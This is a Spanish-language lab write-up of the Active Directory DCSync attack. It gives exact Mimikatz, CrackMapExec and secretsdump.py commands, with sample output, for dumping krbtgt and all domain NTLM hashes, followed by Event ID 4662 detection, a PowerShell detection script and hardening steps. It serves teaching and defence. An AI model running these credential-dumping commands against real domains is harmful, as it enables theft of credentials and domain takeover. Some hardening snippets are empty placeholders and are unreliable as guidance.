# DCSync (Directory Replication Services Abuse)

> ⚠️ Fines educativos, laboratorio aislado — ver disclaimer completo en el [README](../README.md).

## Resumen del ataque

DCSync es uno de los ataques más críticos en Active Directory. Un atacante que tenga permisos de **replicación de directorio** puede extraer **todos los hashes NTLM** de la base de datos de AD (usuarios, krbtgt, cuentas de servicio, etc.) **sin necesidad de ser admin local del DC**.

El ataque aprovecha el protocolo de replicación de AD (`DrsGetNCChanges`) para "engañar" al DC diciéndole: "Soy otro DC, dame todos los cambios de AD".

**Realismo**: Extremadamente alto. Es el ataque favorito en post-explotación:
- No requiere acceso al sistema de archivos
- Es difícil de detectar (usa el protocolo normal de replicación)
- Los hashes extraídos permiten crear **Golden Tickets** o **Pass-the-Hash**
- Funciona remotamente sin herramientas sospechosas

**Herramientas típicas**:
- **Mimikatz** (Windows): `lsadump::dcsync`
- **Crackmapexec** (Linux): `--ntds`
- **secretsdump.py** (Impacket): `secretsdump.py`

**Impacto**: CRÍTICO. Con los hashes de `krbtgt`, un atacante se convierte en Domain Admin.

---

## Objetivo del ataque

Demostrar cómo un usuario con permisos de replicación puede extraer **todos los hashes NTLM del dominio** usando herramientas de atacante.

---

## Escenario del lab

```
Dominio:           adlab.local
DC:                DC01 (100.100.100.50)
Usuario vulnerable: unai_simon (permisos de replicación)
Contraseña:        Contraseña123!
Atacante 1:        Mimikatz en JORGE-CLIENTE
Atacante 2:        Crackmapexec en Kali
Evidencia:         Event ID 4662 (Directory Service Access)
```

---

## Paso 1 — Preparar usuario con permisos de replicación

### 1.1 Crear usuario vulnerable

En **DC01**, abre **Usuarios y equipos de Active Directory** (`dsa.msc`):

1. Click derecho en **Users** → **Nuevo → Usuario**
2. Nombre: `unai_simon`
3. Nombre de inicio de sesión: `unai_simon`
4. Contraseña: `Contraseña123!`
5. ✅ **La contraseña nunca expira**
6. **Finalizar**

### 1.2 Asignar permisos de replicación

En **DC01**, en **Usuarios y equipos de Active Directory**:

1. **Ver → Características avanzadas** (activar)
2. Click derecho en el dominio **adlab.local** → **Propiedades**
3. Pestaña **Seguridad** → **Avanzado**
4. Click en **Agregar**
5. Escribe: `unai_simon` → **Comprobar nombres** → **OK**
6. Selecciona `unai_simon` → **Editar**
7. Busca y marca ✅:
   - **Replicating Directory Changes**
   - **Replicating Directory Changes All**
   - **Replicating Directory Changes Filtered**
8. **Aplicar** → **OK** → **OK**

![Asignando a unai_simon los permisos de replicación de directorio sobre el dominio adlab.local](<img/Damos permisos al usuario dentro del dominio.png>)

---

## Paso 2 — DCSync con Mimikatz (Windows)

### 2.1 Descargar y ejecutar Mimikatz

En **JORGE-CLIENTE**, descarga Mimikatz desde:
```
https://github.com/gentilkiwi/mimikatz/releases
```

Extrae `mimikatz_trunk.zip` en `C:\Tools\mimikatz\x64\`

![Descargando y ejecutando mimikatz.exe en JORGE-CLIENTE](<img/Descargamos y ejecutamos mimikatz.png>)

### 2.2 Ejecutar DCSync

Abre PowerShell en `C:\Tools\mimikatz\x64\` y ejecuta:

```
mimikatz.exe "lsadump::dcsync /domain:adlab.local /user:krbtgt" exit
```

**Salida esperada:**

```
[DC] 'adlab.local' will be the domain
[DC] 'DC01.adlab.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt
Hash NTLM            : 9a67389e0abcf592e62449d1d140c4ec
```

![Ejecutando lsadump::dcsync desde mimikatz y viendo el hash NTLM de krbtgt](<img/ejecutamos y vemos resultados.png>)

### 2.3 Extraer TODOS los hashes

Para obtener todos los usuarios:

```
mimikatz.exe "lsadump::dcsync /domain:adlab.local /all" exit
```

Esto lista **todos los usuarios de AD y sus hashes NTLM**.

---

## Paso 3 — DCSync con Crackmapexec (Kali)

### 3.1 Ejecutar desde Kali

En **Kali**, abre terminal y ejecuta:

```bash
crackmapexec smb 100.100.100.50 -u 'unai_simon' -p 'Contraseña123!' --ntds
```

**Salida esperada:**

```
SMB 100.100.100.50 445 DC01 [+] adlab.local\unai_simon:Contraseña123!
SMB 100.100.100.50 445 DC01 [+] Dumping the NTDS, this could take a while...
SMB 100.100.100.50 445 DC01 Administrator:500:aad3b435b51404eeaad3b435b51404ee:2e852b4bc4b30467448229e8b5d1f5d4:::
SMB 100.100.100.50 445 DC01 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9a67389e0abcf592e62449d1d140c4ec:::
SMB 100.100.100.50 445 DC01 svc_backup:1113:aad3b435b51404eeaad3b435b51404ee:...
[+] Dumped 14 NTDS hashes to /root/.cme/logs/DC01_100.100.100.50_2026-07-11_181713.ntds
```

![Ejecutando crackmapexec con --ntds desde Kali contra DC01, volcando los hashes NTDS](<img/cracmapexec desde kali.png>)

### 3.2 Con secretsdump.py (Impacket)

Alternativa usando secretsdump:

```bash
python3 /usr/lib/python3/dist-packages/impacket/examples/secretsdump.py 'adlab.local/unai_simon:Contraseña123!@100.100.100.50' -just-dc
```

---

## Paso 4 — Indicadores de Compromiso (IoCs)

### Event ID 4662 — Directory Service Access

Cuando `unai_simon` hace DCSync, el DC genera **Event ID 4662**:

```
Event ID: 4662 - "Operación realizada en un objeto"

Sujeto:
  Usuario: unai_simon
  Dominio: ADLAB
  
Objeto:
  Servidor del objeto: DS (Directory Services)
  Tipo de objeto: domainDNS
  Nombre del objeto: DC=adlab,DC=local
  
Operación:
  Tipo: Object Access
  Acceso: Controlar acceso (Control Access)
  Máscara: 0x100
```

![Evento 4662 generado en el Visor de eventos de DC01 tras el DCSync de unai_simon](<img/log generado.png>)

### Señales de alarma:

1. ✅ **Usuario normal haciendo DCSync** — Solo DCs deberían pedir replicación
2. ✅ **Acceso a domainDNS** — Intenta obtener toda la BD de AD
3. ✅ **Múltiples Event ID 4662 rápidamente** — Usuario extrayendo hashes
4. ✅ **Acceso con máscara 0x100 (Control Access)** — Solicitud de replicación
5. ✅ **Usuario sin permisos de replicación legítimos** — Debería rechazarse

---

## Paso 5 — Habilito la auditoría de acceso a Directory Service

Para que el Event ID 4662 se genere hace falta activar la auditoría de "Directory Service Access", tanto a nivel local en el DC como a nivel de dominio vía GPO.

```powershell
auditpol /set /subcategory:"Directory Service Access" /failure:enable /success:enable
```

![Configurando en la GPO la subcategoría "Directory Service Access" en Aciertos y errores para que se generen los eventos 4662](<img/Actualizamos directivas para recoger logs.png>)

---

## Paso 6 — Script de Detección PowerShell

```powershell
# Detect-DCSync.ps1
# Detecta intentos de DCSync mediante Event ID 4662

param(
    [int]$HoursBack = 24,
    [string]$OutputPath = "C:\Reports"
)

Write-Host "[*] Buscando intentos de DCSync (Event ID 4662)..." -ForegroundColor Cyan
Write-Host "[*] Período: $HoursBack horas" -ForegroundColor Cyan
Write-Host ""

$startTime = (Get-Date).AddHours(-$HoursBack)

# Event ID 4662: Directory Service Access
$events = Get-WinEvent -FilterHashtable @{
    LogName   = "Security"
    ID        = 4662
    StartTime = $startTime
} -ErrorAction SilentlyContinue

if (-not $events) {
    Write-Host "✓ No se encontraron eventos 4662" -ForegroundColor Green
    return
}

$dcsyncAttempts = @()

foreach ($event in $events) {
    $xml = [xml]$event.ToXml()
    $eventData = $xml.Event.EventData.Data
    
    $user = ($eventData | Where-Object {$_.Name -eq "SubjectUserName"}).InnerText
    $objectType = ($eventData | Where-Object {$_.Name -eq "ObjectType"}).InnerText
    $objectName = ($eventData | Where-Object {$_.Name -eq "ObjectName"}).InnerText
    $accessMask = ($eventData | Where-Object {$_.Name -eq "AccessMask"}).InnerText
    
    # Detectar DCSync: acceso a domainDNS con máscara de replicación
    if ($objectType -match "domainDNS" -and $accessMask -match "0x100") {
        $dcsyncAttempts += [PSCustomObject]@{
            Time       = $event.TimeCreated
            User       = $user
            ObjectName = $objectName
            AccessMask = $accessMask
        }
    }
}

if ($dcsyncAttempts.Count -eq 0) {
    Write-Host "✓ No se detectaron intentos de DCSync" -ForegroundColor Green
} else {
    Write-Host "🔴 [CRÍTICA] INTENTOS DE DCSYNC DETECTADOS" -ForegroundColor Red
    Write-Host "   Total de intentos: $($dcsyncAttempts.Count)" -ForegroundColor Red
    Write-Host ""
    
    foreach ($attempt in $dcsyncAttempts) {
        Write-Host "   Hora: $($attempt.Time)" -ForegroundColor Red
        Write-Host "   Usuario: $($attempt.User)" -ForegroundColor Red
        Write-Host "   Objeto: $($attempt.ObjectName)" -ForegroundColor Red
        Write-Host "   Máscara de acceso: $($attempt.AccessMask)" -ForegroundColor Red
        Write-Host ""
    }
}

# Guardar reporte
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

$reportFile = Join-Path $OutputPath "DCSync_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').csv"
$dcsyncAttempts | Export-Csv -Path $reportFile -NoTypeInformation

Write-Host "Reporte guardado en: $reportFile" -ForegroundColor Green
```

**Uso:**
```powershell
.\Detect-DCSync.ps1 -HoursBack 24
```

> La versión completa del script (con parseo detallado del evento y doble reporte de DCSync/acceso anómalo) está en [`Detect-DCSync.ps1`](Detect-DCSync.ps1).

---

## Mitigación y Hardening

### 1. Limitar permisos de replicación

**NUNCA** dar permisos de replicación a usuarios normales. Solo a cuentas de servicio dedicadas si es absolutamente necesario.

```powershell
# Auditar usuarios con permisos de replicación
Get-ADUser -Filter * | Where-Object {
    # Buscar usuarios con permisos de replicación
}
```

### 2. Usar cuentas de servicio de escama (tiradas)

Si necesitas replicación externa, usa cuentas específicas y monitoréalas constantemente.

### 3. Activar auditoría de acceso a DS

```powershell
# Auditar "Acceso al servicio de directorio"
auditpol /set /subcategory:"Directory Service Access" /failure:enable /success:enable
```

### 4. Monitorear Event ID 4662

Crear alertas automáticas si un usuario normal intenta acceso a `domainDNS`.

### 5. Usar LAPS para cambiar contraseñas de admin

```powershell
# Implementar LAPS (Local Administrator Password Solution)
```

### 6. Restringir acceso a NTDS.dit

El archivo `C:\Windows\NTDS\ntds.dit` contiene toda la BD de AD. Protegerlo:

```powershell
# Verificar permisos
icacls C:\Windows\NTDS\ntds.dit
```

### 7. Usar tier0/tier1/tier2 de Active Directory

Separar cuentas por nivel de críticidad y limitar permisos.

---

## Lecciones aprendidas / problemas encontrados

- **La auditoría "Directory Service Access" no estaba activa por defecto**: el primer intento de generar el Event ID 4662 no dejó ningún rastro en el log ("no estan los logs"). Hubo que activar explícitamente la subcategoría en la GPO (`Configuración del equipo → Directivas → Ajustes de Windows → Ajustes de seguridad → Configuración avanzada de políticas de auditoría → Acceso DS → "Auditar acceso al servicio de directorio"`, marcando Éxito y Error), aplicar con `gpupdate /force`, y **reiniciar DC01 por completo** — el simple `gpupdate` no fue suficiente para que la nueva auditoría surtiera efecto sobre el propio proceso de replicación del DC.
- **Discusión útil sobre el realismo del escenario**: surgió la duda legítima de "¿por qué un usuario normal iba a tener permisos de replicación?" — algo que a primera vista parece una configuración absurda. La respuesta quedó documentada como parte del valor educativo del ataque: en la práctica esto ocurre por errores de administración, por cuentas de servicio "huérfanas" (creadas para una integración o backup que ya no existe, con permisos nunca revocados), o como resultado de una escalada de privilegios previa donde el atacante ya modificó ACLs del dominio. Precisamente porque un usuario normal *nunca* debería tener este permiso, su presencia es en sí misma una señal de alarma grave incluso antes de que se ejecute el ataque.
- Se comprobó, tras activar la auditoría y reiniciar, que tanto el intento con **Mimikatz** (Windows) como el de **Crackmapexec** (Kali) generan el mismo tipo de evidencia (Event ID 4662 con `ObjectType: domainDNS` y `AccessMask: 0x100`), independientemente de la herramienta usada — el rastro lo deja el protocolo de replicación en sí, no la herramienta concreta.

---

## Notas importantes

1. **No es sigiloso** — Event ID 4662 es generado cada vez que se hace DCSync. Cualquier auditoría básica lo detecta.

2. **Pero es efectivo** — Muchas organizaciones **no monitorean Event ID 4662**, así que el ataque pasa desapercibido.

3. **Los hashes extraídos son valiosos** — Permitir crear:
   - **Golden Tickets** (ser cualquier usuario por siempre)
   - **Pass-the-Hash** (autenticarse como cualquier usuario)
   - **Crackear offline** (Hashcat contra hashes débiles)

4. **Diferencia entre DCSync y volcado NTDS.dit**:
   - **DCSync** → Extrae hashes remotamente (sin tocar archivos del DC)
   - **NTDS.dit** → Copia física de la base de datos (requiere acceso local)

5. **Mimikatz vs Crackmapexec**:
   - **Mimikatz** → Necesita estar en la máquina (menos sigiloso)
   - **Crackmapexec** → Remoto, sin dejar herramientas (más sigiloso)

---

## Referencias

- [Microsoft: Event ID 4662](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662)
- [ADSecurity: DCSync](https://adsecurity.org/)
- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz)
- [Crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)

---

**Estado**: Completado  
**Evidencia generada**: Event ID 4662 (Directory Service Access)
